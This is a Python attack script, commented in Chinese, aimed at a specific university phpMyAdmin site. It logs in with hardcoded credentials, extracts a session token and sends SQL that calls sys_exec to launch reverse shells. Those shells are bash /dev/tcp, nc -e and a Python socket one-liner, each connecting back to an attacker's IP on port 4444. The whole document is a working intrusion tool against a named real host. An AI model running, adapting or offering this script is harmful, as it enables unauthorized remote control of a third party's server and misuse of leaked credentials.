#!/usr/bin/env python3
"""
使用phpMyAdmin的sys_exec函数执行反向shell
需要用户提供监听IP和端口
"""
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")
print("[*] 使用sys_exec执行反向shell")
print("[!] 请先在你的机器上运行: nc -lvp 4444")

# 反向shell命令（需要替换为实际IP）
LHOST = "YOUR_IP_HERE"  # 替换为你的IP
LPORT = "4444"

# 尝试多种反向shell方式
reverse_shells = [
    f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    f"nc -e /bin/bash {LHOST} {LPORT}",
    f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"]);'",
]

for shell_cmd in reverse_shells:
    print(f"\n[*] 尝试: {shell_cmd[:50]}...")
    sql = f"SELECT sys_exec('{shell_cmd}');"
    sql_data = {"sql_query": sql, "db": "mysql"}
    resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)
    
    print(f"[*] 响应状态: {resp.status_code}")
    print("[*] 检查你的监听器是否收到连接...")

print("\n[!] 如果无法获取反向shell，可能需要:")
print("    1. 检查sys_exec函数是否有执行权限")
print("    2. 检查网络连接和防火墙")
print("    3. 尝试其他获取shell的方法")
